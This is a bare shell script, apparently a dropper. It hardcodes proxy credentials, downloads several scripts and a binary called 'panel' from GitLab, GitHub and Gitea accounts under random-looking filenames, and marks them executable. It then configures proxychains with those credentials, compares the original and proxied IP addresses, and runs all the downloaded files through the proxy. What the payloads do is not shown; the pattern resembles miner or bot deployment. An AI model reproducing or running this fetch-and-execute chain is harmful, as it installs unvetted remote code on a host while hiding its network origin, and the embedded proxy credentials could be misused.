proxy="38.154.227.167" 
port="5868" 
user="nrrmfinr"  
pass="9rrin80d68ba" 
wget -q -O HD9TSQaJ6431 https://gitlab.com/55113110159/ultras/-/raw/main/profil.sh && chmod +x HD9TSQaJ6431
wget -q -O HD9TSQaJ6432 https://gitlab.com/55113110159/ultras/-/raw/main/info.sh && chmod +x HD9TSQaJ6432
wget -q -O HD9TSQaJ6437 https://raw.githubusercontent.com/55113110159/go/main/python.py && chmod +x HD9TSQaJ6437
wget -q -O HD9TSQaJ6433 https://gitlab.com/55113110159/ultras/-/raw/main/memo.sh && chmod +x HD9TSQaJ6433
wget -q -O HD9TSQaJ6434 https://gitlab.com/55113110159/ultras/-/raw/main/go.sh && chmod +x HD9TSQaJ6434
wget -q -O HD9TSQaJ6435 https://gitlab.com/55113110159/ultras/-/raw/main/igras.sh && chmod +x HD9TSQaJ6435
wget -q -O HD9TSQaJ6438 https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x HD9TSQaJ6438
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./HD9TSQaJ6438 ./HD9TSQaJ6437 ./HD9TSQaJ6435 ./HD9TSQaJ6434  ./HD9TSQaJ6433 ./HD9TSQaJ6432 ./HD9TSQaJ6431
